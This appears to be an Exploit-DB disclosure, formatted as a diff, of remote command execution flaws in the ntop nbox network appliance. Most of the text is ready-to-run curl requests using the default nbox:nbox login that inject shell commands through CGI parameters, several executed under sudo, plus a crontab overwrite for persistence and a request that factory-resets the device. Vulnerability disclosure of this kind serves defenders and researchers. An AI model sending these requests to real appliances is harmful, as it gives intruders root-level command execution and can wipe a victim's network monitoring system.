@@ -1,0 +1,65 @@
+E-DB Note: Source ~ http://carnal0wnage.attackresearch.com/2016/08/got-any-rces.html
+
+(The issues were found originally in nbox 2.3 and confirmed in nbox 2.5)
+
+
+
+To make things easier, I created a Vagrantfile with provisioning so you can have your own nbox appliance and test my findings or give it a shot. There is more stuff to be found, trust me :)
+
+https://github.com/javuto/nbox-pwnage 
+
+
+
+
+
+
+*Replace NTOP-BOX with the IP address of your appliance (presuming that you already logged in). Note that most of the RCEs are wrapped in sudo so it makes the pwnage much more interesting:
+
+RCE: POST against https://NTOP-BOX/ntop-bin/write_conf_users.cgi with parameter cmd=touch /tmp/HACK
+  curl -sk --user nbox:nbox --data 'cmd=touch /tmp/HACK' 'https://NTOP-BOX/ntop-bin/write_conf_users.cgi'
+
+
+
+RCE: POST against https://NTOP-BOX/ntop-bin/rrd_net_graph.cgi with parameters interface=;touch /tmp/HACK;
+  curl -sk --user nbox:nbox --data 'interface=;touch /tmp/HACK;' 'https://NTOP-BOX/ntop-bin/rrd_net_graph.cgi'
+
+
+
+RCE (Wrapped in sudo): GET https://NTOP-BOX/ntop-bin/pcap_upload.cgi?dir=|touch%20/tmp/HACK&pcap=pcap
+  curl -sk --user nbox:nbox 'https://NTOP-BOX/ntop-bin/pcap_upload.cgi?dir=|touch%20/tmp/HACK&pcap=pcap'
+
+
+
+RCE (Wrapped in sudo): GET https://NTOP-BOX/ntop-bin/sudowrapper.cgi?script=adm_storage_info.cgi&params=P%22|whoami%3E%20%22/tmp/HACK%22|echo%20%22
+  curl -sk --user nbox:nbox 'https://NTOP-BOX/ntop-bin/sudowrapper.cgi?script=adm_storage_info.cgi&params=P%22|whoami%3E%20%22/tmp/HACK%22|echo%20%22'
+
+
+
+RCE: POST against https://NTOP-BOX/ntop-bin/do_mergecap.cgi with parameters opt=Merge&base_dir=/tmp&out_dir=/tmp/DOESNTEXIST;touch /tmp/HACK;exit%200
+  curl -sk --user nbox:nbox --data 'opt=Merge&base_dir=/tmp&out_dir=/tmp/DOESNTEXIST;touch /tmp/HACK;exit 0' 'https://NTOP-BOX/ntop-bin/do_mergecap.cgi'
+
+There are some other interesting things, for example, it was possible to have a persistent XSS by rewriting crontab with a XSS payload on it, but they fixed it in 2.5. However the crontab overwrite (Wrapped in sudo) is still possible:
+
+  GET https://NTOP-BOX/ntop-bin/do_crontab.cgi?act_cron=COMMANDS%20TO%20GO%20IN%20CRON
+
+  curl -sk --user nbox:nbox 'https://NTOP-BOX/ntop-bin/do_crontab.cgi?act_cron=COMMANDS%20TO%20GO%20IN%20CRON'
+
+
+
+The last one is a CSRF that leaves the machine fried, by resetting the machine completely:
+
+  GET https://NTOP-BOX/ntop-bin/do_factory_reset.cgi
+
+  curl -sk --user nbox:nbox 'https://NTOP-BOX/ntop-bin/do_factory_reset.cgi'
+
+
+
+Modules for metasploit and BeEF will come soon. I hope this time the issues are not just silently patched...
+
+
+
+If you have any questions or feedback, hit me up in twitter (@javutin)!
+
+
+
+Have a nice day!
